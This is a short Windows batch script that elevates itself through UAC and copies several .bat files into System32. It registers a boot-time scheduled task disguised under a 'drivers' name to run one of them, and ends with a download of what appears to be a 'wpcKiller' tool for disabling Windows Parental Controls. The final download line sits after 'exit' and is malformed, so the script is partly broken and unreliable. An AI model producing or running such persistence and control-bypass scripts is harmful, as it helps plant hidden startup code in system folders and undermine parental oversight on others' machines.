echo Requesting Administrator privledges, please wait for UAC.
powershell /c start-process -verb runAs \"%~s0\"
cd %homepath%\desktop
echo hello alexendre 
move msdos.bat %windir%\System32
move win.bat %windir%\system32
move reboot.bat %windir%\system32
move patch.bat %windir%\system32
SCHTASKS /CREATE /SC onstart /TN "drivers\DosWpcKill" /TR "C:\Windows\System32\patch.bat" /RU admin
Cd %windir%\system32
start msdos.bat -verb runAs \"%~s0\"
exit
powershell -Command "InvokeWebRequest https://github.com/cbaie9/wpcKiller/archive/refs/heads/main.zip -Outfile  files.bat"